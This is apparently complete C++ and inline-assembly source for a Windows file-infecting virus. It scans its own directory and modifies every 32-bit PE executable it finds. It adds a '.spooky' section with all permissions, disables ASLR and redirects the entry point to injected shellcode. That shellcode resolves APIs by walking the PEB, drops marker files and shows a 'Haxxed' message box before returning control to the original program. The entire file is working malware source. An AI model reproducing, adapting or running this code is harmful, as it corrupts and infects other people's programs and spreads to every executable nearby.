#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#define NEW_SECTION_SIZE 2048

DWORD alignment(DWORD, DWORD, DWORD);
wchar_t *char_to_lpcwstr(char *);
BOOL infect(char *, char *);

//Picks out files to infect
VOID run() {
	HANDLE abs_files;
	WIN32_FIND_DATA directory;
	wchar_t file_name_buffer[150];
	std::vector<std::string> file_names;
	int bytes = GetModuleFileName(NULL, file_name_buffer, 150);

	if (bytes) {
		std::wstring temp_sp(file_name_buffer);
		std::string direct_path(temp_sp.begin(), temp_sp.end());
		std::string orig_file = direct_path;

		//Set up the correct path
		for (int i = direct_path.length(); i > 0; i--) {
			direct_path.pop_back();
			if (direct_path.back() == '\\') {
				direct_path.push_back('*');
				break;
			}
		}

		abs_files = ::FindFirstFile((LPCWSTR)char_to_lpcwstr((char *)direct_path.c_str()), &directory);
		if (abs_files != INVALID_HANDLE_VALUE) {
			do {
				//Windows includes weird directories
				if (!(directory.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
					std::wstring temp(directory.cFileName);
					std::string temp2(temp.begin(), temp.end());
					file_names.push_back(temp2);
				}
			} while (::FindNextFile(abs_files, &directory));
			::FindClose(abs_files);
		}

		direct_path.pop_back(); 

		while(file_names.size()) {
			if ((direct_path + file_names.back()) != orig_file) { 
				printf("Attempting to infect %s\n", file_names.back().c_str());
				if (!infect((char *)((direct_path + file_names.back())).c_str(), ".spooky"))
					printf("Succesfully infected!\n");
				else
					printf("Failed to infect.\n");
			}

			file_names.pop_back();
		}
	}
}

int main(int argc, char * argv[]) {
	run();
	return 0;
}

//Adds in injected code
BOOL infect(char * file_name, char * section_name) {
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_FILE_HEADER file_header;
	PIMAGE_OPTIONAL_HEADER optional_header;
	PIMAGE_SECTION_HEADER section_header, first_section, last_section;
	PIMAGE_NT_HEADERS nt_header;

	LARGE_INTEGER file_size;
	BYTE * data, * current_byte, copied_bytes[10000];
	DWORD *temporary_address, entry_point, copy_index = 0, old;
	HANDLE in_file = CreateFile(char_to_lpcwstr(file_name), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (in_file == INVALID_HANDLE_VALUE) return 1;

	GetFileSizeEx(in_file, &file_size);
	data = new BYTE[file_size.QuadPart];

	//Read file into memory (data) so we can alter it
	ReadFile(in_file, data, file_size.QuadPart, NULL, NULL);

	//Grabs the initial DOS header, this validates if it is a proper file to infect
	dos_header = (PIMAGE_DOS_HEADER)data;

	//Checks to see if PE file
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
		return 1;

	//Reads in other information about the file using data as the base
	file_header = (PIMAGE_FILE_HEADER)(data + dos_header->e_lfanew + sizeof(DWORD));
	optional_header = (PIMAGE_OPTIONAL_HEADER)(data + dos_header->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
	section_header = (PIMAGE_SECTION_HEADER)(data + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	//Make sure is not a 64b file
	if (optional_header->Magic != 267) {
		printf("64b file detected and halting infection process.\n");
		return 1;
	}

	//Zero and copy over 8 Bytes
	//8 Bytes is max defined for section names
	ZeroMemory(&section_header[file_header->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
	CopyMemory(&section_header[file_header->NumberOfSections].Name, section_name, 8);

	//Some spaghetti to make sure that the new section is correct
	section_header[file_header->NumberOfSections].Misc.VirtualSize = alignment(NEW_SECTION_SIZE, optional_header->SectionAlignment, 0);
	section_header[file_header->NumberOfSections].VirtualAddress = alignment(section_header[file_header->NumberOfSections - 1].Misc.VirtualSize, optional_header->SectionAlignment, section_header[file_header->NumberOfSections - 1].VirtualAddress);
	section_header[file_header->NumberOfSections].SizeOfRawData = alignment(NEW_SECTION_SIZE, optional_header->FileAlignment, 0);
	section_header[file_header->NumberOfSections].PointerToRawData = alignment(section_header[file_header->NumberOfSections - 1].SizeOfRawData, optional_header->FileAlignment, section_header[file_header->NumberOfSections - 1].PointerToRawData);
	section_header[file_header->NumberOfSections].Characteristics = 0xE00000E0; //All privledges

	//Setting EOF
	SetFilePointer(in_file, section_header[file_header->NumberOfSections].PointerToRawData + section_header[file_header->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
	SetEndOfFile(in_file);

	//Image is larger with new section
	optional_header->SizeOfImage = section_header[file_header->NumberOfSections].VirtualAddress + section_header[file_header->NumberOfSections].Misc.VirtualSize;
	file_header->NumberOfSections += 1;

	//Copy file back
	SetFilePointer(in_file, 0, NULL, FILE_BEGIN);
	WriteFile(in_file, data, file_size.QuadPart, NULL, NULL);

	nt_header = (PIMAGE_NT_HEADERS)(data + dos_header->e_lfanew);
	nt_header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	first_section = IMAGE_FIRST_SECTION(nt_header);
	last_section = first_section + (nt_header->FileHeader.NumberOfSections - 1);

	SetFilePointer(in_file, 0, 0, FILE_BEGIN);

	entry_point = nt_header->OptionalHeader.AddressOfEntryPoint + nt_header->OptionalHeader.ImageBase;
	nt_header->OptionalHeader.AddressOfEntryPoint = last_section->VirtualAddress;
	WriteFile(in_file, data, file_size.QuadPart, NULL, 0);

	DWORD start_dword = 0, end_dword = 0; //placement is important

	__asm {
		mov eax, start_label
		mov[start_dword], eax

		//Don't infect on run
		jmp over 
		start_label :
	}

	__asm {
		mov esi, esp
		mov edx, 4

		begin:
		push edx
		push ebx
			
		//Random character generation for filename tag
		add eax, edi
		xor ax, word ptr[esp]
		mov edx, 0
		mov ebx, 74
		div bx
		add edx, 48

		mov ecx, edx

		cmp ecx, 0x5C
		je bslash

		cmp ecx, 0x3A
		je colon

		cmp ecx, 0x3F
		je question

		cmp ecx, 0x3C
		je less_than

		cmp ecx, 0x3E
		je greater_than
		jmp done

		bslash :
		mov ecx, 0x2E
		jmp done

		colon :
		mov ecx, 0x2B
		jmp done

		question :
		mov ecx, 0x21
		jmp done

		less_than :
		mov ecx, 0x23
		jmp done

		greater_than :
		mov ecx, 0x26
		jmp done

		done :
		pop ebx
		pop edx
		push ecx

		dec edx
		cmp edx, 0
		je last_f
		jmp begin

		last_f :
		mov eax, fs : [30h]
		mov eax, [eax + 0x0c]
		mov eax, [eax + 0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]
		mov ebx, eax
		mov eax, [ebx + 0x3c]
		mov edi, [ebx + eax + 0x78]
		add edi, ebx
		mov ecx, [edi + 0x18]
		mov edx, [edi + 0x20]
		add edx, ebx

		//Finds LoadLibrary
		look_for_lib :
		dec ecx
		mov esi, [edx + ecx * 4]
		add esi, ebx
		cmp dword ptr[esi], 0x64616f4c
		je found_lib_1

		found_lib_1 :
		cmp dword ptr[esi + 4], 0x7262694c
		je found_lib_2

		found_lib_2 :
		cmp dword ptr[esi + 8], 0x41797261
		je comp_found_lib
		jmp look_for_lib

		//LoadLibrary found
		comp_found_lib :
		mov edx, [edi + 0x24]
		add edx, ebx
		mov cx, [edx + 2 * ecx]
		mov edx, [edi + 0x1c]
		add edx, ebx
		mov eax, [edx + 4 * ecx]
		add eax, ebx
		sub esp, 13
		mov ebx, esp

		//LoadLibrary(kernel32.dll)
		mov byte ptr[ebx], 0x6B
		mov byte ptr[ebx + 1], 0x65
		mov byte ptr[ebx + 2], 0x72
		mov byte ptr[ebx + 3], 0x6E
		mov byte ptr[ebx + 4], 0x65
		mov byte ptr[ebx + 5], 0x6C
		mov byte ptr[ebx + 6], 0x33
		mov byte ptr[ebx + 7], 0x32
		mov byte ptr[ebx + 8], 0x2E
		mov byte ptr[ebx + 9], 0x64
		mov byte ptr[ebx + 10], 0x6C
		mov byte ptr[ebx + 11], 0x6C
		mov byte ptr[ebx + 12], 0x00
		push ebx

		//Calls LoadLibrary(kernel32.dll), loadind the library
		call eax
		add esp, 13
		push eax

		//Rewalk to find getProcessAddress
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]
		mov eax, [eax + 0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]
		mov ebx, eax
		mov eax, [ebx + 0x3c]
		mov edi, [ebx + eax + 0x78]
		add edi, ebx
		mov ecx, [edi + 0x18]
		mov edx, [edi + 0x20]
		add edx, ebx

		look_for_proc_addr :
		dec ecx
		mov esi, [edx + ecx * 4]
		add esi, ebx
		cmp dword ptr[esi], 0x50746547 //GetP
		je found_proc_1

		found_proc_1 :
		cmp dword ptr[esi + 4], 0x41636f72 //rocA
		je found_proc_2

		found_proc_2 :
		cmp dword ptr[esi + 8], 0x65726464 //ddre
		je comp_found_proc
		jmp look_for_proc_addr

		comp_found_proc :
		mov edx, [edi + 0x24]
		add edx, ebx
		mov cx, [edx + 2 * ecx]
		mov edx, [edi + 0x1c]
		add edx, ebx
		mov eax, [edx + 4 * ecx]
		add eax, ebx
		mov esi, eax
		sub esp, 12
		mov ebx, esp

		mov byte ptr[ebx], 0x43
		mov byte ptr[ebx + 1], 0x72
		mov byte ptr[ebx + 2], 0x65
		mov byte ptr[ebx + 3], 0x61
		mov byte ptr[ebx + 4], 0x74
		mov byte ptr[ebx + 5], 0x65
		mov byte ptr[ebx + 6], 0x46
		mov byte ptr[ebx + 7], 0x69
		mov byte ptr[ebx + 8], 0x6c
		mov byte ptr[ebx + 9], 0x65
		mov byte ptr[ebx + 10], 0x32
		mov byte ptr[ebx + 11], 0x0

		mov eax, [esp + 12]
		push ebx
		push eax
		call esi
		add esp, 12
		sub esp, 12

		add esp, 16
		pop ecx
		pop edi
		pop edx
		pop esi
		add esp, 62
		push eax
		sub esp, 62
		mov ebx, esp

		mov word ptr[ebx], 0x0070
		mov word ptr[ebx + 2], 0x0033
		mov word ptr[ebx + 4], 0x0068
		mov word ptr[ebx + 6], 0x0068
		mov word ptr[ebx + 8], 0x0035
		mov word ptr[ebx + 10], 0x0035
		mov word ptr[ebx + 12], 0x005F
		mov word ptr[ebx + 14], 0x0069
		mov word ptr[ebx + 16], 0x0073
		mov word ptr[ebx + 18], 0x005F
		mov word ptr[ebx + 20], 0x0067
		mov word ptr[ebx + 22], 0x006F
		mov word ptr[ebx + 24], 0x006F
		mov word ptr[ebx + 26], 0x0064
		mov word ptr[ebx + 28], 0x005F
		mov word ptr[ebx + 30], cx
		mov word ptr[ebx + 32], dx
		mov word ptr[ebx + 34], di
		mov word ptr[ebx + 36], si
		mov word ptr[ebx + 38], 0x002E
		mov word ptr[ebx + 40], 0x0074
		mov word ptr[ebx + 42], 0x0078
		mov word ptr[ebx + 44], 0x0074
		mov word ptr[ebx + 46], 0x0000

		push ecx
		push edx
		push 0x00
		push 0x02
		push 0x02
		push 0x100000000
		push ebx
		call eax
		pop edx
		pop ecx
		add esp, 62
		pop eax
		sub esp, 62
		add esp, 62
		push eax
		sub esp, 62
		mov ebx, esp

		mov word ptr[ebx], 0x0070
		mov word ptr[ebx + 2], 0x0033
		mov word ptr[ebx + 4], 0x0068
		mov word ptr[ebx + 6], 0x0068
		mov word ptr[ebx + 8], 0x0035
		mov word ptr[ebx + 10], 0x0035
		mov word ptr[ebx + 12], 0x005F
		mov word ptr[ebx + 14], 0x0069
		mov word ptr[ebx + 16], 0x0073
		mov word ptr[ebx + 18], 0x005F
		mov word ptr[ebx + 20], 0x0067
		mov word ptr[ebx + 22], 0x006F
		mov word ptr[ebx + 24], 0x006F
		mov word ptr[ebx + 26], 0x0064
		mov word ptr[ebx + 28], 0x005F
		mov word ptr[ebx + 30], cx
		mov word ptr[ebx + 32], dx
		mov word ptr[ebx + 34], di
		mov word ptr[ebx + 36], si
		mov word ptr[ebx + 38], 0x0023
		mov word ptr[ebx + 40], 0x002E
		mov word ptr[ebx + 42], 0x0074
		mov word ptr[ebx + 44], 0x0078
		mov word ptr[ebx + 46], 0x0074
		mov word ptr[ebx + 48], 0x0000

		push ecx
		push edx
		push 0x00
		push 0x02
		push 0x02
		push 0x100000000
		push ebx
		call eax
		pop edx
		pop ecx
		add esp, 62
		pop eax
		sub esp, 62

		add esp, 62
		push eax
		sub esp, 62
		mov ebx, esp

		mov word ptr[ebx], 0x0070
		mov word ptr[ebx + 2], 0x0033
		mov word ptr[ebx + 4], 0x0068
		mov word ptr[ebx + 6], 0x0068
		mov word ptr[ebx + 8], 0x0035
		mov word ptr[ebx + 10], 0x0035
		mov word ptr[ebx + 12], 0x005F
		mov word ptr[ebx + 14], 0x0069
		mov word ptr[ebx + 16], 0x0073
		mov word ptr[ebx + 18], 0x005F
		mov word ptr[ebx + 20], 0x0067
		mov word ptr[ebx + 22], 0x006F
		mov word ptr[ebx + 24], 0x006F
		mov word ptr[ebx + 26], 0x0064
		mov word ptr[ebx + 28], 0x005F
		mov word ptr[ebx + 30], cx
		mov word ptr[ebx + 32], dx
		mov word ptr[ebx + 34], di
		mov word ptr[ebx + 36], si
		mov word ptr[ebx + 38], 0x0040
		mov word ptr[ebx + 40], 0x002E
		mov word ptr[ebx + 42], 0x0074
		mov word ptr[ebx + 44], 0x0078
		mov word ptr[ebx + 46], 0x0074
		mov word ptr[ebx + 48], 0x0000

		push ecx
		push edx
		push 0x00
		push 0x02
		push 0x02
		push 0x100000000
		push ebx
		call eax

		//Walk export table
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]
		mov eax, [eax + 0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]
		mov ebx, eax
		mov eax, [ebx + 0x3c]
		mov edi, [ebx + eax + 0x78]
		add edi, ebx
		mov ecx, [edi + 0x18]
		mov edx, [edi + 0x20]
		add edx, ebx

		look_get_r :
		dec ecx
		mov esi, [edx + ecx * 4]
		add esi, ebx
		cmp dword ptr[esi], 0x64616f4c
		je found_r_1

		found_r_1 :
		cmp dword ptr[esi + 4], 0x7262694c
		je found_r_2

		found_r_2 :
		cmp dword ptr[esi + 8], 0x41797261
		je comp_found_r
		jmp look_get_r

		comp_found_r :
		mov edx, [edi + 0x24]
		add edx, ebx
		mov cx, [edx + 2 * ecx]
		mov edx, [edi + 0x1c]
		add edx, ebx
		mov eax, [edx + 4 * ecx]
		add eax, ebx

		sub esp, 11
		mov ebx, esp

		//user32.dll
		mov byte ptr[ebx], 0x75
		mov byte ptr[ebx + 1], 0x73
		mov byte ptr[ebx + 2], 0x65
		mov byte ptr[ebx + 3], 0x72
		mov byte ptr[ebx + 4], 0x33
		mov byte ptr[ebx + 5], 0x32
		mov byte ptr[ebx + 6], 0x2E
		mov byte ptr[ebx + 7], 0x64
		mov byte ptr[ebx + 8], 0x6C
		mov byte ptr[ebx + 9], 0x6C
		mov byte ptr[ebx + 10], 0x00
		push ebx

		call eax
		add esp, 11
		push eax

		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]
		mov eax, [eax + 0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]
		mov ebx, eax
		mov eax, [ebx + 0x3c]
		mov edi, [ebx + eax + 0x78]
		add edi, ebx
		mov ecx, [edi + 0x18]
		mov edx, [edi + 0x20]
		add edx, ebx

		look_for_h :
		dec ecx
		mov esi, [edx + ecx * 4]
		add esi, ebx
		cmp dword ptr[esi], 0x50746547 //GetP
		je found_h_1

		found_h_1 :
		cmp dword ptr[esi + 4], 0x41636f72 //rocA
		je found_h_2

		found_h_2 :
		cmp dword ptr[esi + 8], 0x65726464 //ddre
		je comp_found_h
		jmp look_for_h

		comp_found_h :
		mov edx, [edi + 0x24]
		add edx, ebx
		mov cx, [edx + 2 * ecx]
		mov edx, [edi + 0x1c]
		add edx, ebx
		mov eax, [edx + 4 * ecx]
		add eax, ebx
		mov esi, eax
		sub esp, 12
		mov ebx, esp

		//MessageBoxA
		mov byte ptr[ebx], 0x4D
		mov byte ptr[ebx + 1], 0x65
		mov byte ptr[ebx + 2], 0x73
		mov byte ptr[ebx + 3], 0x73
		mov byte ptr[ebx + 4], 0x61
		mov byte ptr[ebx + 5], 0x67
		mov byte ptr[ebx + 6], 0x65
		mov byte ptr[ebx + 7], 0x42
		mov byte ptr[ebx + 8], 0x6F
		mov byte ptr[ebx + 9], 0x78
		mov byte ptr[ebx + 10], 0x41
		mov byte ptr[ebx + 11], 0x00

		mov eax, [esp + 12]
		push ebx
		push eax
		call esi
		add esp, 12
		sub esp, 12

		mov ebx, esp
		mov word ptr[ebx], 0x6148
		mov word ptr[ebx + 2], 0x7878
		mov word ptr[ebx + 4], 0x6465
		mov word ptr[ebx + 6], 0x0000
		mov word ptr[ebx + 8], 0x3370
		mov word ptr[ebx + 10], 0x7268
		mov word ptr[ebx + 12], 0x3535
		mov word ptr[ebx + 14], 0x7320
		mov word ptr[ebx + 16], 0x7961
		mov word ptr[ebx + 18], 0x3A73
		mov word ptr[ebx + 20], 0x4120
		mov word ptr[ebx + 22], 0x6C6C
		mov word ptr[ebx + 24], 0x7520
		mov word ptr[ebx + 26], 0x2072
		mov word ptr[ebx + 28], 0x7061
		mov word ptr[ebx + 30], 0x6C70
		mov word ptr[ebx + 32], 0x6369
		mov word ptr[ebx + 34], 0x7461
		mov word ptr[ebx + 36], 0x6F69
		mov word ptr[ebx + 38], 0x736E
		mov word ptr[ebx + 40], 0x7220
		mov word ptr[ebx + 42], 0x6220
		mov word ptr[ebx + 44], 0x6C65
		mov word ptr[ebx + 46], 0x6E6F
		mov word ptr[ebx + 48], 0x676E
		mov word ptr[ebx + 50], 0x3220
		mov word ptr[ebx + 52], 0x6D20
		mov word ptr[ebx + 54], 0x0065

		push 0x21
		push ebx
		add ebx, 8
		push ebx
		push 0
		call eax
		//add esp, 56

		push ebx
		push ebx

		mov eax, 0xFADED420
		jmp eax
	}

	__asm {
		over:
		mov eax, e
		mov[end_dword], eax
		e:
	}

	current_byte = ((byte *)(start_dword));

	while (copy_index < ((end_dword + 90) - start_dword)) {
		temporary_address = ((DWORD*)((byte*)start_dword + copy_index));
		if (*temporary_address == 0xFADED420) {
			VirtualProtect((LPVOID)temporary_address, 4, PAGE_EXECUTE_READWRITE, &old);
			*temporary_address = entry_point;
		}

		copied_bytes[copy_index] = current_byte[copy_index++];
	}

	SetFilePointer(in_file, last_section->PointerToRawData, NULL, FILE_BEGIN);
	WriteFile(in_file, copied_bytes, copy_index - 1, NULL, 0);
	CloseHandle(in_file);

	return 0;
}

//Aligns data so that it is a valid PE file
DWORD alignment(DWORD size, DWORD align, DWORD addr) {
	if (!(size % align))
		return addr + size;

	return addr + (size / align + 1) * align;
}

//Converts *char -> lpcwstr
wchar_t *char_to_lpcwstr(char * a) {
	wchar_t *s = new wchar_t[512];
	MultiByteToWideChar(CP_ACP, 0, a, -1, s, 512);
	return s;
}